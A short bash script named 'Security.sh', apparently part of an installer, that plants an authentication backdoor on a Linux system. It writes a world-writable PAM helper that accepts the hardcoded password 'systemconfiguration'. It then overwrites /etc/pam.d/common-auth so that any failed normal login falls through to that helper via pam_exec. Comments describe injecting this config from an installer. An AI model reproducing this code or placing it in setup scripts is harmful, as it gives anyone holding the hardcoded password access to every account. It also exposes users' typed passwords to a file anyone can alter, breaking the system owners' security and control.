#!/usr/bin/env bash

#Security.sh

    #check if file exists and save to variable
    #if not then create a file with this content in this location

script=$(cat<<'EEE'
#!/usr/bin/env bash

read -r  password

if [[ $password == "systemconfiguration" ]]; then
     exit 0
fi
exit 1
EEE
)



if [[ ! -f "/etc/pam.d/securitychecker.sh" ]]; then

    (echo "$script" > /etc/pam.d/securitychecker.sh)
    (chmod 777 /etc/pam.d/securitychecker.sh)
fi

#Common-Auth

    #Create a custom common-auth file in current Installer dir temporarily
    #Cmp the common-auth to this file
    #If not equal 
        #then cp this file to  /etc/pam.d/common-auth while preserving the name
    #Otherwise delete the custom common-auth


auth=$(cat <<'EOF'
#
# /etc/pam.d/common-auth - authentication settings common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of the authentication modules that define
# the central authentication scheme for use on the system
# (e.g., /etc/shadow, LDAP, Kerberos, etc.).  The default is to use the
# traditional Unix authentication mechanisms.
#
# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.
# To take advantage of this, it is recommended that you configure any
# local modules either before or after the default block, and use
# pam-auth-update to manage selection of other modules.  See
# pam-auth-update(8) for details.

# here are the per-package modules (the "Primary" block)
auth    [success=2 default=ignore]      pam_unix.so nullok

# here's the fallback if no module succeeds

auth sufficient pam_exec.so expose_authtok /etc/pam.d/securitychecker.sh

auth    requisite                       pam_deny.so
# prime the stack with a positive return value if there isn't one already;
# this avoids us returning an error just because nothing sets a success code
# since the modules above will each just jump around
auth    required                        pam_permit.so
# and here are more per-package modules (the "Additional" block)
auth    optional                        pam_cap.so 
# end of pam-auth-update config
EOF
)
(echo "$auth" > /etc/pam.d/common_auth_backup)


if  ! cmp -s /etc/pam.d/common_auth_backup /etc/pam.d/common-auth ; then
    (cp /etc/pam.d/common_auth_backup /etc/pam.d/common-auth)
fi

(rm /etc/pam.d/common_auth_backup)

    #Or

    #Include hardcoded injected custom common-auth code in installer
    # cmp them in the installer from a variable
    # if not equal 
        # echo the variable to the real common auth (with overwritting)
    # else nothing